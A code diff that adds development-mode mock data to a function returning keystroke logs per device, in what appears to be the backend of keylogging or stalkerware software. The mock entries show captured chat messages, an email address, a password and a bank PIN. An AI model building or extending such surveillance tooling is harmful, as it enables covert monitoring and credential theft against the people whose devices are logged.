@@ -134,9 +134,90 @@ export async function createKeylog(keylog: InsertKeylog): Promise<void> {
 }
 
 export async function getKeylogsByDevice(deviceId: string) {
+  // In development, always use mock data
+  if (process.env.NODE_ENV !== 'production') {
+    console.log("[Database] Development mode: using mock keylogs");
+    // Mock data para desenvolvimento
+    const mockKeylogs = [
+      {
+        id: 1,
+        deviceId,
+        userId: "user1",
+        appName: "WhatsApp",
+        keyText: "Oi, tudo bem?",
+        createdAt: new Date(Date.now() - 1000 * 60 * 5),
+        isDeleted: 0,
+      },
+      {
+        id: 2,
+        deviceId,
+        userId: "user1",
+        appName: "Gmail",
+        keyText: "usuario@email.com",
+        createdAt: new Date(Date.now() - 1000 * 60 * 10),
+        isDeleted: 0,
+      },
+      {
+        id: 3,
+        deviceId,
+        userId: "user1",
+        appName: "WhatsApp",
+        keyText: "Sim, e você?",
+        createdAt: new Date(Date.now() - 1000 * 60 * 15),
+        isDeleted: 0,
+      },
+      {
+        id: 4,
+        deviceId,
+        userId: "user1",
+        appName: "Instagram",
+        keyText: "Que foto legal!",
+        createdAt: new Date(Date.now() - 1000 * 60 * 20),
+        isDeleted: 0,
+      },
+      {
+        id: 5,
+        deviceId,
+        userId: "user1",
+        appName: "Gmail",
+        keyText: "senha123",
+        createdAt: new Date(Date.now() - 1000 * 60 * 25),
+        isDeleted: 0,
+      },
+      {
+        id: 6,
+        deviceId,
+        userId: "user1",
+        appName: "WhatsApp",
+        keyText: "Reunião amanhã?",
+        createdAt: new Date(Date.now() - 1000 * 60 * 30),
+        isDeleted: 0,
+      },
+      {
+        id: 7,
+        deviceId,
+        userId: "user1",
+        appName: "Banco",
+        keyText: "1234",
+        createdAt: new Date(Date.now() - 1000 * 60 * 35),
+        isDeleted: 0,
+      },
+      {
+        id: 8,
+        deviceId,
+        userId: "user1",
+        appName: "Chrome",
+        keyText: "www.google.com",
+        createdAt: new Date(Date.now() - 1000 * 60 * 40),
+        isDeleted: 0,
+      },
+    ];
+    return mockKeylogs;
+  }
+
   const db = await getDb();
   if (!db) {
-    console.warn("[Database] Cannot get keylogs: database not available");
+    console.warn("[Database] Cannot get keylogs: database not available, returning empty");
     return [];
   }
 
